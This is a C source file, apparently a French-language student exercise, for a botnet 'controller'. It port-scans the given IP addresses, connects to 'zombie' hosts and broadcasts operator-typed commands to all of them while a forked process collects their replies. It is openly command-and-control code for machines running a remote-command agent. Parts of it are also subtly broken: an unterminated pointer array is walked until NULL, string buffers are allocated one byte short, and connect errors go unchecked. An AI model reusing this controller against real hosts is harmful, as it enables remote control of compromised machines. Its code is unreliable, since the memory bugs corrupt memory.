#include <poll.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>


#include "utils_v2.h"
#include "messages.h"

/**
 * PRE  : /
 * POST : Affiche et g�re le menu.
 * RES  : /
 */
void menu() {

	printf("\t\t====  menu  ====\n");
	printf("\t(1) chercher les zombies\n");
	printf("\t(2) envoyer un message a un zombie\n");
	printf("\t(3) envoyer un message a tous les zombies\n");
	printf("\t(4) tuer un zombie\n");
	printf("\t\t================\n");
	write(1, "\n> ", 3*sizeof(char));

	int choix;
	scanf("%d", &choix);

	printf("\n\tvotre choix : %d\n", choix);

}
/**
 * PRE  : zombies     : a table of all zombies to send the command to.
 *	  zombieCount : the count of zombies in the table.
 * POST : The user will be asked for a command, which will be sent to all the zombies given in the arguments.
 * RES  : nothing.
 */
void sendCommands(int * zombies, int zombieCount){
	char command[BUFF_SZ] = {0};
	int bytesRead = 0;
	write(1, "\n> ", 3 * sizeof(char));
	do{
		bytesRead = read(0, command, BUFF_SZ);
		command[bytesRead] = '\0';
		for(int i = 0;i < zombieCount;i++){
			write(zombies[i], command, strlen(command));
		}
	} while(bytesRead > 0);
}

/**
 * PRE  : zombies     : a table of all zombies to send the command to.
 *	  zombieCount : the count of zombies in the table.
 * POST : this command will listen to all zombies given in the arguments, and display their answers to the screen.
 * RES  : nothing.
 */
void receiveAnswers(int * zombies, int zombieCount){
	struct pollfd * zombie_fds = (struct pollfd *) malloc(zombieCount * sizeof(struct pollfd));
	bool * acceptZombie = (bool *) malloc(zombieCount * sizeof(bool)); 
	for(int i = 0;i < zombieCount;i++){
		zombie_fds[i].fd = zombies[i];
		zombie_fds[i].events = POLLIN;
		acceptZombie[i] = true;
	}

	char buffer[BUFF_SZ] = {0};

	while(1){
		int poll_res = poll(zombie_fds, zombieCount, 0);
		if(poll_res < 0){
			printf("Erreur de pollfd!\n");
			exit(1);
		} 
		if(poll_res > 0){
			for(int i = 0;i < zombieCount;i++){
				if(zombie_fds[i].revents & POLLIN && acceptZombie[i]){
					bool pasFini = false;
					int bytesRead = 0;
					printf("\n----------\n\tlistening to file descriptor : %d \n\n", zombie_fds[i].fd);
					do{
						bytesRead = read(zombie_fds[i].fd, buffer, BUFF_SZ);
						printf("nombres lus : %d\n", bytesRead);
						buffer[bytesRead] = '\0';
						write(1, buffer, strlen(buffer));
						if(bytesRead == BUFF_SZ){
							pasFini = true;
						}else{
							pasFini = false;
						}
					}while(bytesRead > 0 && pasFini);
					if(bytesRead == 0){
						acceptZombie[i] = false;
					}
					write(1, "\n> ", 3 * sizeof(char));
				}
			}
		}
		

	}
	free(acceptZombie);
	free(zombie_fds);
}


/**
 * PRE  : ip    :  l'adresse ip.
 *        port  :  le port désiré.
 * POST : une nouvelle connection est créée. Celle-ci communique avec l'adresse ip fournie, sur le port fourni.
 * RES  : un fd d'un socket sur l'adresse et le port passé en paramètre ou -1 en cas d'erreur.
 */
int createConnection(char * ip, int port) {
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		perror("Erreur lors de la cr�ation du socket");
		return -1;
	}
    
	struct sockaddr_in addr = {0};
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	inet_aton(ip, &addr.sin_addr);
    
	connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        
	return sock;
}




int main(int argc, char **argv) {
	write(1, "\n", sizeof(char));
	if (argc < 2) {
   		printf("\tUsage : controller [ip address] * (1..n)\n\n");
		return 1;
	}
	
	char ** ips = (char **) malloc((argc - 1) * sizeof(char *));
	int * zombies = NULL;
	int zombieCount = 0;

	for(int i = 1;i < argc;i++){
		ips[i - 1] = (char *) malloc(strlen(argv[i]) * sizeof(char));
		strcpy(ips[i - 1], argv[i]);
	}


	int sock = -1;
	int connectedPort = -1;

	for (int i = 0; ips[i] != NULL; i++) {
		for (int port = MIN_PORT; port <= MAX_PORT; port++) {
			sock = createConnection(ips[i], port);

			if (sock < 0) {
				continue; 
			}
        
			struct sockaddr_in addr;
			socklen_t addr_len = sizeof(addr);
			getpeername(sock, (struct sockaddr *)&addr, &addr_len);
			connectedPort = ntohs(addr.sin_port);

			if (connectedPort != port) {
				close(sock);
				continue; 
			}

			if(zombies == NULL){
				zombies = (int *) malloc(sizeof(int));
				zombies[0] = sock;
				zombieCount = 1;
			}else{
				zombieCount++;
				zombies = (int *) realloc(zombies, zombieCount * sizeof(int));
				zombies[zombieCount - 1] = sock;
			}

			printf("Connexion �tablie avec %s:%d\n", ips[i], port);

 		}

		if (sock >= 0) {
			break; 
		}
	}


	pid_t pid = fork();
	if(pid < 0){
		free(zombies);

		for(int i = 0;i < argc - 1;i++){
			free(ips[i]);
		}
		free(ips);
		printf("Erreur lors du fork.\n");
		return 1; 
	}
	if(pid){
		sendCommands(zombies, zombieCount);
		waitpid(pid, NULL, 0);
	}else{
		receiveAnswers(zombies, zombieCount);
		return 0;
	}


	
	free(zombies);

	for(int i = 0;i < argc - 1;i++){
		free(ips[i]);
	}
	free(ips);

	return 0;
}
